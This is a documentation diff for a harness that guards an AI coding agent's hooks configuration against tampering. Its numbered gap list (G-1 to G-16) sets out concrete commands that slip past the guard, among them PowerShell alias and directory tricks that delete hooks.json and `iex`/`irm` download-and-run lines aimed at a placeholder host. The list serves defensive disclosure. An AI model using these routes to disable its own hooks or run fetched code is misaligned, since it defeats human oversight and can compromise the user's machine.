@@ -1,7 +1,7 @@
 ---
 type: Provider
 title: "Antigravity provider"
-description: "The Antigravity adapter — the CLI (agy 1.2.13) as the one surface the floor is claimed for, the three wired events, the fail-closed posture that turns every harness failure into a refusal, recovery from the shared global hooks file, what is not supported, and the gaps nobody measured."
+description: "The Antigravity adapter — the CLI (agy 1.2.14) as the one surface the floor is claimed for, the three wired events, the fail-closed posture that turns every harness failure into a refusal, recovery from the shared global hooks file, what is not supported, and the gaps nobody measured."
 tags: [provider, antigravity, fail-closed]
 timestamp: "2026-09-30"
 ---
@@ -14,7 +14,7 @@ Source: `src/providers/antigravity/`. Decision record: [/decisions/ad-156.md](/d
 
 | Surface | Floor |
 | --- | --- |
-| Antigravity CLI (`agy` 1.2.13) | enforced — the only surface this provider claims |
+| Antigravity CLI (`agy` 1.2.14) | enforced — the only surface this provider claims |
 | Antigravity IDE 2.0.2 | unverified |
 | Antigravity app 2.18.1 | unverified |
 
@@ -105,21 +105,32 @@ The tool table in `antigravity.tools.ts` is the only place in the repository tha
 | `run_command` | — | `shell.before` | `shell.after` | `CommandLine`, `Cwd` |
 | `invoke_subagent` | `Task` | `tool.before` | `tool.after` | the subagent type, only when exactly one is spawned |
 
-A tool not in this table passes with its native name.
+A tool not in this table passes with its native name, and the floor refuses it as `wiring-tamper` when any
+string of its arguments names either hooks file (G-7).
 
 ## Wiring target
 
 `antigravity.wiring.ts` writes one root key, `tlc-harness`, into `~/.gemini/config/hooks.json`
 (strategy `named-group`). Every other key in that file is the operator's: install keeps their values and their
 order, and a second install with the same runtime leaves the file byte-identical. Install refuses a launcher
-path containing a space, and refuses to touch a file that is not a JSON object.
+path containing a space, and refuses to touch a file that is not a JSON object. Quoting does not help: on `agy`
+1.2.14 quotes are not shell quoting — the host splits the hook command on spaces, a quote stays a literal
+character in the argument, and the hook's working directory is the directory of the hooks.json file (measured on
+2026-09-30, including under `cmd.exe /d /s /c`).
 
 Install, update and init never write the workspace `.agents/hooks.json` nor
 `~/.gemini/antigravity-cli/settings.json`. `tlc harness init` says so when the host is present.
 
 Both hooks files are protected wiring targets for **every** provider: the global file, and
 `<projectDir>/.agents/hooks.json` for the event's own project. A `Write`, `Edit` or `MultiEdit` to either, from
-any host, is refused as `wiring-tamper`. Reading them with `view_file` or `Read` stays allowed.
+any host, is refused as `wiring-tamper`; outside Antigravity that refusal compares the textual path (G-12).
+Reading them with `view_file` or `Read` stays allowed.
+
+In an Antigravity event the floor also receives this host's facts through the port
+([/decisions/ad-157.md](/decisions/ad-157.md)): a `run_command` resolves relative operands against its `Cwd`, and
+a `Cwd` carrying `$`, `%` or a backtick is judged as unresolvable; destroying, moving or renaming `.agents`,
+`~/.gemini/config` or `~/.gemini` is `wiring-tamper`; the comparison with both files and those directories
+ignores case; and on Windows the shell route compares the alias-free form of both sides.
 
 ## Failure posture
 
@@ -157,8 +168,8 @@ and a `launcher-error` before a tool.
 
 ## Recovery
 
-The global file is shared with the IDE and the app. With the group in place, a surface nobody verified, or a
-CLI newer than 1.2.13 that sends another payload, can fire the group and have **every tool denied** with
+The global file is shared with the IDE and the app. With the group in place, a surface nobody verified, or
+a CLI newer than 1.2.14 that sends another payload, can fire the group and have **every tool denied** with
 `unrecognized-payload` or `invalid-stdin`. The doctor cannot see the IDE or the app: a surface that never
 fires sends no payload to inspect.
 
@@ -181,17 +192,56 @@ resort every time the group is in place.
 
 - Hooks inside a subagent were measured in spike S3, on CLI 1.2.14, with the group in the workspace
   `.agents/hooks.json`: the subagent's tools fire neither `PreToolUse` nor `PostToolUse`. The global group in
-  `~/.gemini/config/hooks.json`, where `tlc harness install` writes the floor, was not measured with a subagent.
-  Do not count on the floor for subagents.
-- MCP tool calls were not captured.
-- `multi_replace_file_content` is not verified: its arguments are assumed from its single-edit sibling, and only
-  the path is read.
-- `Remove-Item` and other PowerShell cmdlets are outside the floor's POSIX destructive verbs.
-- A relative path is resolved against `projectDir`, not against the command's `Cwd`, so a `Cwd` the model
-  chooses inside `.agents` with `./hooks.json` reaches the file without `wiring-tamper`.
+  `~/.gemini/config/hooks.json`, where `tlc harness install` writes the floor, was measured with a subagent on
+  CLI 1.2.14 on 2026-09-30: only the parent's tools fired, and the subagent's `view_file` and `send_message`
+  fired neither `PreToolUse` nor `PostToolUse`. Do not count on the floor for subagents.
+- Measured limitation: CLI 1.2.14 in print mode did not load a configured MCP server (`MCP_UNAVAILABLE`, log
+  `empty component: prompt section "mcp_servers"`), and no MCP tool payload was captured.
+- Measured limitation: CLI 1.2.14 in print mode did not offer `multi_replace_file_content` in two sessions; the
+  editing tools available were `write_to_file` and `replace_file_content`. The mapping stays unverified and its
+  fixture stays synthetic: its arguments are assumed from its single-edit sibling, and only the path is read.
+- Measured limitation: the IDE 2.0.2 and the app 2.18.1 are installed but made no tool call, so `Stop` and
+  `PostToolUse` were not measured on them.
+- G-1: a shell path built from an environment variable is not resolved (`$env:`, `$HOME`).
+- G-2: a download handed to `Invoke-Expression` by a means that is not a fetch verb is not recognized
+  (`DownloadString`, `Start-BitsTransfer`). Not every download by a fetch verb is recognized either — see G-16.
+- G-3: the content of a script run by `-File` or `Invoke-Command -FilePath` is not inspected, like `sh ./x.sh`.
+- G-4: `Get-Content ./x.ps1 | iex`, and downloading to a file and then running it, are allowed, like `sh ./x.sh`.
+- G-5: the arguments of `Start-Process` (`-ArgumentList`) and a parameter value before the executable are not
+  inspected.
+- G-6: .NET methods (`[IO.File]`), WMI/CIM (`Invoke-CimMethod`) and COM objects are not recognized.
+- G-7: a tool outside the translation table is checked only by the `textual` name of the two hooks.json files,
+  with no canonical form.
+- G-8: the `Cwd` base applies only to `run_command`. With an unresolvable `Cwd`, a read or a write through a
+  relative operand of a verb that neither destroys nor moves or renames, in a command that does not name
+  `hooks.json`, is not refused.
+- G-9: the project root is not a protected ancestor, and an operand with a glob is resolved as literal text
+  (`.\*`).
+- G-10: indirection through an alias, a function, a variable or a name computed in a string expression is not
+  recognized (`Set-Alias`, `'Re'+'move-Item'`).
+- G-11: a writer that reaches a hooks.json file through the directory that holds it, without being a
+  destructive, move or rename verb, is not refused (`robocopy`, `Expand-Archive`).
+- G-12: in a Cursor or Claude session, case, protected ancestors, textual names, `Cwd` and the canonical form on
+  the shell route do not apply, so `Remove-Item -Recurse -Force .agents` or `rm ./.AGENTS/hooks.json` is not
+  refused as `wiring-tamper` (`.AGENTS`).
+- G-13: the `\\?\UNC\` prefix and hardlinks are not resolved, neither in the write tools nor on the shell route
+  and `Cwd`.
+- G-14: a directory change inside the command itself (`cd`, `chdir`, `Set-Location`, `sl`, `Push-Location`,
+  `pushd`) does not change the base of the relative operands of the following segments, which stay resolved
+  against the `run_command` `Cwd` or the project, so `Set-Location .agents; Remove-Item -Force .\hooks.json` is
+  not refused.
+- G-15: a directory link (junction or symlink) created in one segment and used in a following segment of the
+  same command is not resolved (`mklink`), because only a link that exists when the decision is made is followed.
+- G-16: a fetch verb in the argument of `Invoke-Expression` is recognized in two positions only: as the first
+  name of a following word of the same `iex` segment, or of the rest of the head word after its first `(`
+  (`iex(irm …`); and as the head of the segment right after an `iex` segment whose last word ends in `(`, like the
+  `(` that an `&` splits off in `iex (& irm …)`. Both positions also hold for an `iex` inside executed text, like
+  `pwsh -c "iex (& irm …)"`. In any other position of the argument it is not recognized, so
+  `iex ([string](irm https://example.invalid/x))`, `iex (& { irm https://example.invalid/x })` and
+  `iex $(& { irm https://example.invalid/x })` are not refused, the last because the first name falls on `{`
+  (`[string](irm`, `& { irm`).
 - Only the `.agents/hooks.json` of `workspacePaths[0]` is protected; the other roots of a multi-root workspace
   are not.
-- A tool outside the translation table passes with its native name and is not seen by the floor's path rules.
 - `define_subagent` can turn on `enable_write_tools`, and the floor sees it as a generic tool.
 - Stop may run twice per execution loop; there is no deduplication.
 - The effect of a deny on `Stop` was not measured.
@@ -202,7 +252,9 @@ resort every time the group is in place.
 - `allow` in an interactive session was not measured.
 - A payload change in a CLI newer than 1.2.14 was not measured. The stdin captures are from 1.2.13; 1.2.14
   payloads were seen only in spike S3 and in the end-to-end proof.
-- A launcher path containing a space is not supported.
+- A launcher path containing a space is not supported: on `agy` 1.2.14 quotes are not shell quoting — the
+  command is split on spaces, a quote stays literal, and the hook's working directory is the directory of the
+  hooks.json file (measured on 2026-09-30, including under `cmd.exe /d /s /c`).
 - The hook inherits environment variables whose names look like credentials.
 - `~/.gemini/antigravity-cli/settings.json` and plugin hooks are not protected.
 - The harness's `allow` does not grant the host's own headless permission for `run_command`.
